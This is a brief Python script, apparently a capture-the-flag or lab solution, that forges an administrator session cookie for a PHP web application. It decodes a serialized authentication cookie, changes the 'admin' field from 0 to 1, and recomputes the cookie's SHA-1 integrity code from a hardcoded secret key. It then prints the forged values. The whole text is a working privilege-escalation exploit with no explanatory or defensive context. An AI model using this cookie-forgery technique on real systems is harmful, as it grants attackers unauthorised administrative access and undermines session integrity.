#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Yanis Alim

import urllib.parse
import hashlib

SECRET = "Co:6x,1B;S1$6T2V"
AUTH   = "a%253A3%253A%257Bs%253A2%253A%2522id%2522%253Bs%253A3%253A%2522176%2522%253Bs%253A5%253A%2522admin%2522%253Bs%253A1%253A%25220%2522%253Bs%253A4%253A%2522cart%2522%253Ba%253A0%253A%257B%257D%257D"
MAC    = "360d0d3ddfb60ea396b4e3af78f595e595613496"

AUTH = urllib.parse.unquote(urllib.parse.unquote(AUTH))
ADMIN_INDEX = AUTH.index('admin";s:1:"') + len('admin";s:1:"')
AUTH = AUTH[:ADMIN_INDEX] + "1" + AUTH[ADMIN_INDEX+1:]
PAYLOAD = SECRET + AUTH
MAC  = hashlib.sha1( PAYLOAD.encode() ).hexdigest()

print("AUTH : ",urllib.parse.quote(urllib.parse.quote(AUTH)))
print("MAC  : ",MAC)